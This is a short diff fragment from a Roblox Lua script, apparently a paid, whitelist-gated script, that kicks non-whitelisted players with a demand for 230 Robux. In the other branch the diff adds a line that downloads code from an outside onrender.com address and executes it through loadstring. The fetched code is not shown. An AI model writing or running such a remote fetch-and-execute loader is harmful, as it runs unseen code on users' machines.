@@ -20,7 +20,7 @@ if game.Players.LocalPlayer then
         player:Kick("NOT  WhiteListed || BUY PAID - JUST 230 ROBUX  ")
     else
 
-
+loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/99216c7b6975950291de00accd6ee51d"))()
 
 
 
